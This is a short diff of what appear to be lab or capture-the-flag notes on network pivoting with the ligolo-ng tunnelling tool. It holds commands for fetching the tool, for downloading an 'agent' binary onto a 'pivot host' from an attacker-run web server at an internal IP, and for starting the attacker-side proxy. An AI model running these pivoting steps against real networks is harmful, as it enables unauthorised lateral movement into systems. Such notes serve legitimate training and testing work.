@@ -3,13 +3,16 @@ wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-n
 ```
 
 
+
 ```pivot host 1
 wget http://10.10.15.245:8000/agent
-
 ```
 
 
 
+```attacker
+sudo ./proxy -selfcert
+```
 
 
 
